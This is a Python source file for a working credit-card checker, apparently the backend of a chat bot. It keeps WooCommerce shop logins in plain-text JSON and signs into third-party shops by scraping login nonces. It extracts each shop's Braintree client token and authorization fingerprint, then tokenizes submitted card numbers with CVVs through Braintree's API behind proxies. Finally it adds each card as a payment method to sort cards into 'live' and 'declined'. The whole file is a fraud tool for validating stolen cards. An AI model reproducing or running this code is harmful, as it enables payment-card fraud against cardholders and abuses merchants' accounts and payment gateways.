import requests
import re
import random
import string
import http.cookiejar as cookielib
import json
import os
import base64
from proxy_manager import get_proxy_dict

def generate_user_agent():
    return 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'

def load_all_bt_sites():
    try:
        if os.path.exists('bt_sites.json'):
            with open('bt_sites.json', 'r') as f:
                return json.load(f)
    except:
        pass
    return {}

def save_all_bt_sites(sites):
    with open('bt_sites.json', 'w') as f:
        json.dump(sites, f, indent=2)

def load_bt_site_config(user_id, slot=None):
    sites = load_all_bt_sites()
    user_sites = sites.get(str(user_id), {})
    
    if isinstance(user_sites, dict) and 'site' in user_sites:
        user_sites = {'1': user_sites}
        sites[str(user_id)] = user_sites
        save_all_bt_sites(sites)
    
    if slot is None:
        return user_sites
    return user_sites.get(str(slot))

def get_next_slot(user_id):
    user_sites = load_bt_site_config(user_id)
    if not user_sites:
        return 1
    existing = [int(k) for k in user_sites.keys() if k.isdigit()]
    return max(existing) + 1 if existing else 1

def save_bt_site_config(user_id, site, email, password, slot=None):
    sites = load_all_bt_sites()
    user_id = str(user_id)
    
    if user_id not in sites:
        sites[user_id] = {}
    elif isinstance(sites[user_id], dict) and 'site' in sites[user_id]:
        sites[user_id] = {'1': sites[user_id]}
    
    if slot is None:
        slot = get_next_slot(user_id)
    
    sites[user_id][str(slot)] = {
        'site': site,
        'email': email,
        'password': password
    }
    
    save_all_bt_sites(sites)
    return int(slot)

def delete_bt_site_config(user_id, slot):
    sites = load_all_bt_sites()
    user_id = str(user_id)
    slot = str(slot)
    
    if user_id in sites and slot in sites[user_id]:
        del sites[user_id][slot]
        save_all_bt_sites(sites)
        return True
    return False

def list_bt_sites(user_id):
    user_sites = load_bt_site_config(user_id)
    if not user_sites or not isinstance(user_sites, dict):
        return []
    
    result = []
    for slot, config in user_sites.items():
        if isinstance(config, dict) and 'site' in config:
            result.append({
                'slot': slot,
                'site': config['site'],
                'email': config['email']
            })
    return sorted(result, key=lambda x: int(x['slot']))

def verify_bt_login(site, email, password):
    try:
        site = site.rstrip('/')
        if not site.startswith('http'):
            site = 'https://' + site
        
        r = requests.Session()
        
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }
        
        login_urls = [f'{site}/login/', f'{site}/my-account/']
        nonce = None
        nonce_type = None
        login_url = None
        
        for url in login_urls:
            try:
                req = r.get(url, headers=headers, timeout=30)
                if req.status_code == 200:
                    ur_match = re.search(r'id="user-registration-login-nonce"[^>]*value="([^"]+)"', req.text)
                    if ur_match:
                        nonce = ur_match.group(1)
                        nonce_type = 'user-registration'
                        login_url = url
                        break
                    
                    ur_frontend_match = re.search(r'name="ur_frontend_form_nonce"\s*value="([^"]+)"', req.text)
                    if not ur_frontend_match:
                        ur_frontend_match = re.search(r'id="ur_frontend_form_nonce"[^>]*value="([^"]+)"', req.text)
                    if ur_frontend_match:
                        nonce = ur_frontend_match.group(1)
                        nonce_type = 'ur-frontend'
                        login_url = url
                        break
                    
                    wc_match = re.search(r'name="woocommerce-login-nonce"\s*value="([^"]+)"', req.text)
                    if not wc_match:
                        wc_match = re.search(r'id="woocommerce-login-nonce"[^>]*value="([^"]+)"', req.text)
                    if wc_match:
                        nonce = wc_match.group(1)
                        nonce_type = 'woocommerce'
                        login_url = url
                        break
            except:
                continue
        
        if not nonce:
            return {'success': False, 'message': 'Site not found or not WooCommerce'}

        headers.update({
            'content-type': 'application/x-www-form-urlencoded',
            'origin': site,
            'referer': login_url,
        })

        if nonce_type == 'user-registration':
            data = {
                'username': email,
                'password': password,
                'user-registration-login-nonce': nonce,
                '_wp_http_referer': login_url.replace(site, ''),
                'login': 'Login',
                'redirect': '',
            }
        elif nonce_type == 'ur-frontend':
            data = {
                'username': email,
                'password': password,
                'ur_frontend_form_nonce': nonce,
                '_wp_http_referer': login_url.replace(site, ''),
                'login': 'Login',
                'redirect': '',
            }
        else:
            data = {
                'username': email,
                'password': password,
                'rememberme': 'forever',
                'woocommerce-login-nonce': nonce,
                '_wp_http_referer': login_url.replace(site, ''),
                'login': 'Log in',
            }

        r2 = r.post(login_url, headers=headers, data=data, timeout=30)
        
        if 'logout' in r2.text.lower() or 'dashboard' in r2.text.lower() or 'account' in r2.url.lower():
            payment_urls = [
                f'{site}/customer-account/add-payment-method/',
                f'{site}/my-account/add-payment-method/',
            ]
            for purl in payment_urls:
                try:
                    r3 = r.get(purl, headers=headers, timeout=30)
                    if r3.status_code == 200 and 'braintree' in r3.text.lower():
                        return {'success': True, 'message': 'Login successful, Braintree detected'}
                except:
                    continue
            return {'success': False, 'message': 'Site does not use Braintree gateway'}
        else:
            return {'success': False, 'message': 'Invalid email or password'}
            
    except requests.exceptions.Timeout:
        return {'success': False, 'message': 'Connection timeout'}
    except Exception as e:
        return {'success': False, 'message': str(e)[:100]}

def check_card(card_data: str, user_id: str, slot: str = '1') -> dict:
    config = load_bt_site_config(user_id, slot)
    if not config:
        return {
            'card': card_data,
            'status': 'ERROR',
            'message': f'No site configured for slot {slot}. Use /addbtsite first',
            'approved': False
        }
    
    site = config['site']
    email = config['email']
    password = config['password']
    
    try:
        cards = card_data.strip().split('|')
        if len(cards) != 4:
            return {
                'card': card_data,
                'status': 'INVALID',
                'message': 'Invalid format. Use: XXXX|MM|YY|CVV',
                'approved': False
            }
        
        site = site.rstrip('/')
        if not site.startswith('http'):
            site = 'https://' + site
        
        r = requests.Session()
        proxies = get_proxy_dict()
        
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }
        
        login_urls = [f'{site}/login/', f'{site}/my-account/']
        nonce = None
        nonce_type = None
        login_url = None
        req = None
        
        for url in login_urls:
            try:
                req = r.get(url, headers=headers, timeout=30)
                if req.status_code == 200:
                    ur_match = re.search(r'id="user-registration-login-nonce"[^>]*value="([^"]+)"', req.text)
                    if ur_match:
                        nonce = ur_match.group(1)
                        nonce_type = 'user-registration'
                        login_url = url
                        break
                    
                    ur_frontend_match = re.search(r'name="ur_frontend_form_nonce"\s*value="([^"]+)"', req.text)
                    if not ur_frontend_match:
                        ur_frontend_match = re.search(r'id="ur_frontend_form_nonce"[^>]*value="([^"]+)"', req.text)
                    if ur_frontend_match:
                        nonce = ur_frontend_match.group(1)
                        nonce_type = 'ur-frontend'
                        login_url = url
                        break
                    
                    wc_match = re.search(r'name="woocommerce-login-nonce"\s*value="([^"]+)"', req.text)
                    if not wc_match:
                        wc_match = re.search(r'id="woocommerce-login-nonce"[^>]*value="([^"]+)"', req.text)
                    if wc_match:
                        nonce = wc_match.group(1)
                        nonce_type = 'woocommerce'
                        login_url = url
                        break
            except:
                continue
        
        if not nonce:
            return {
                'card': card_data,
                'status': 'ERROR',
                'message': 'Failed to get login nonce - site may not be WooCommerce',
                'approved': False
            }

        headers.update({
            'content-type': 'application/x-www-form-urlencoded',
            'origin': site,
            'referer': login_url,
        })

        if nonce_type == 'user-registration':
            data = {
                'username': email,
                'password': password,
                'user-registration-login-nonce': nonce,
                '_wp_http_referer': login_url.replace(site, ''),
                'login': 'Login',
                'redirect': '',
            }
        elif nonce_type == 'ur-frontend':
            data = {
                'username': email,
                'password': password,
                'ur_frontend_form_nonce': nonce,
                '_wp_http_referer': login_url.replace(site, ''),
                'login': 'Login',
                'redirect': '',
            }
        else:
            data = {
                'username': email,
                'password': password,
                'rememberme': 'forever',
                'woocommerce-login-nonce': nonce,
                '_wp_http_referer': login_url.replace(site, ''),
                'login': 'Log in',
            }

        r2 = r.post(login_url, headers=headers, data=data, timeout=30)
        
        if 'logout' not in r2.text.lower() and 'account' not in r2.url.lower():
            return {
                'card': card_data,
                'status': 'ERROR',
                'message': 'Failed to login to site',
                'approved': False
            }

        add_pm_urls = [
            f'{site}/customer-account/add-payment-method/',
            f'{site}/my-account/add-payment-method/',
        ]
        
        r4 = None
        add_pm_url = None
        for url in add_pm_urls:
            try:
                r4 = r.get(url, headers=headers, timeout=30)
                if r4.status_code == 200 and 'braintree' in r4.text.lower():
                    add_pm_url = url
                    break
            except:
                continue
        
        if not r4 or 'braintree' not in r4.text.lower():
            return {
                'card': card_data,
                'status': 'ERROR',
                'message': 'Site does not use Braintree payment gateway',
                'approved': False
            }

        token_patterns = [
            r'wc_braintree_client_token\s*=\s*\["([^"]+)"\]',
            r'"clientToken"\s*:\s*"([^"]+)"',
            r'braintree\.client\.create\(\s*\{\s*authorization\s*:\s*["\']([^"\']+)["\']',
            r'data-braintree-token="([^"]+)"',
            r'data-braintree-client-token="([^"]+)"',
            r'"client_token"\s*:\s*"([^"]+)"',
            r'clientToken\s*=\s*["\']([^"\']+)["\']',
        ]
        
        client_token = None
        for pattern in token_patterns:
            match = re.search(pattern, r4.text)
            if match:
                client_token = match.group(1)
                break
        
        if not client_token:
            return {
                'card': card_data,
                'status': 'ERROR',
                'message': 'Failed to get Braintree client token',
                'approved': False
            }

        auth_fingerprint = None
        try:
            token_clean = client_token.replace('-', '+').replace('_', '/')
            padding = 4 - len(token_clean) % 4
            if padding != 4:
                token_clean += '=' * padding
            decoded = base64.b64decode(token_clean).decode('utf-8')
            token_data = json.loads(decoded)
            auth_fingerprint = token_data.get('authorizationFingerprint')
        except:
            try:
                decoded = base64.b64decode(client_token).decode('utf-8')
                token_data = json.loads(decoded)
                auth_fingerprint = token_data.get('authorizationFingerprint')
            except:
                auth_fingerprint = client_token if len(client_token) > 50 else None

        if not auth_fingerprint:
            return {
                'card': card_data,
                'status': 'ERROR',
                'message': 'Failed to extract authorization fingerprint',
                'approved': False
            }

        user_agent = generate_user_agent()
        cc_number = cards[0]
        cc_month = cards[1]
        cc_year = cards[2]
        cc_cvv = cards[3]
        
        if len(cc_year) == 2:
            cc_year = '20' + cc_year

        headers_braintree = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': f'Bearer {auth_fingerprint}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': site,
            'referer': f'{site}/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': user_agent,
        }

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'dropin2',
                'sessionId': 'a5deb879-1007-406e-8830-769fff810eae',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc_number,
                        'expirationMonth': cc_month,
                        'expirationYear': cc_year,
                        'cvv': cc_cvv,
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        r5 = r.post('https://payments.braintree-api.com/graphql', headers=headers_braintree, json=json_data, timeout=30, proxies=proxies)
        res = r5.json()
        
        if 'errors' in res:
            error_msg = res['errors'][0].get('message', 'Unknown error') if res['errors'] else 'Unknown error'
            return {
                'card': card_data,
                'status': 'DECLINED',
                'message': error_msg,
                'approved': False
            }
        
        token = res.get('data', {}).get('tokenizeCreditCard', {}).get('token')
        if not token:
            return {
                'card': card_data,
                'status': 'DECLINED',
                'message': 'Failed to tokenize card',
                'approved': False
            }

        add_pm_nonce = re.search(r'id="woocommerce-add-payment-method-nonce"[^>]*value="([^"]+)"', r4.text)
        if not add_pm_nonce:
            add_pm_nonce = re.search(r'name="_wpnonce"[^>]*value="([^"]+)"', r4.text)
        
        nonce_value = add_pm_nonce.group(1) if add_pm_nonce else ''

        final_headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': site,
            'referer': add_pm_url,
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'upgrade-insecure-requests': '1',
            'user-agent': user_agent,
        }

        final_data = {
            'payment_method': 'braintree_credit_card',
            'wc-braintree-credit-card-card-type': 'visa',
            'wc-braintree-credit-card-3d-secure-enabled': '',
            'wc-braintree-credit-card-3d-secure-verified': '',
            'wc-braintree-credit-card-3d-secure-order-total': '0.00',
            'wc_braintree_credit_card_payment_nonce': token,
            'wc_braintree_device_data': '{"correlation_id":"' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)) + '"}',
            'wc-braintree-credit-card-tokenize-payment-method': 'true',
            'woocommerce-add-payment-method-nonce': nonce_value,
            '_wp_http_referer': add_pm_url.replace(site, ''),
            'woocommerce_add_payment_method': '1',
        }

        r6 = r.post(add_pm_url, headers=final_headers, data=final_data, timeout=20, allow_redirects=True)
        
        response_text = r6.text.lower()
        
        if 'added' in response_text or 'success' in response_text or 'payment-methods' in r6.url:
            return {
                'card': card_data,
                'status': 'APPROVED',
                'message': 'Card Added Successfully',
                'approved': True
            }
        elif 'insufficient' in response_text:
            return {
                'card': card_data,
                'status': 'APPROVED',
                'message': 'Insufficient Funds (CVV Match)',
                'approved': True
            }
        elif 'cvv' in response_text or 'cvc' in response_text:
            return {
                'card': card_data,
                'status': 'APPROVED',
                'message': 'CVV Mismatch (Live Card)',
                'approved': True
            }
        elif '3d' in response_text or 'secure' in response_text or 'authentication' in response_text:
            return {
                'card': card_data,
                'status': 'APPROVED',
                'message': '3D Secure Required',
                'approved': True
            }
        elif 'declined' in response_text or 'denied' in response_text:
            error_match = re.search(r'(error|declined|denied)[^<]*', response_text)
            error_msg = error_match.group(0)[:100] if error_match else 'Card Declined'
            return {
                'card': card_data,
                'status': 'DECLINED',
                'message': error_msg,
                'approved': False
            }
        else:
            return {
                'card': card_data,
                'status': 'DECLINED',
                'message': 'Unknown response',
                'approved': False
            }

    except requests.exceptions.Timeout:
        return {
            'card': card_data,
            'status': 'ERROR',
            'message': 'Request timed out',
            'approved': False
        }
    except Exception as e:
        return {
            'card': card_data,
            'status': 'ERROR',
            'message': str(e)[:150],
            'approved': False
        }
